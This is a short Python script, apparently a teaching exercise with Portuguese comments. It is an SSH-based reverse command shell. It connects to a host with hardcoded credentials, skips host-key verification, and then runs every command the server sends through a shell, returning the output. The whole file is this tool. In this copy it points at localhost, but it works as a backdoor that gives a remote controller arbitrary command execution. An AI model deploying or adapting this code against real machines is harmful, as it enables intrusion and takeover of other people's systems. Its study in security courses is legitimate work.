import threading
import paramiko
import subprocess

def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()
    #client.load_host_keys('/home/justin/.ssh/know_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024))   # le o banner
        while True:
            command = ssh_session.recv(1024)    # obtem o comando do servidor ssh
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(bytes(cmd_output))
            except Exception as err:
                ssh_session.send(str(err))
        client.close()
    return

ssh_command('127.0.0.1', 'justin', 'teste', 'ClientConnected')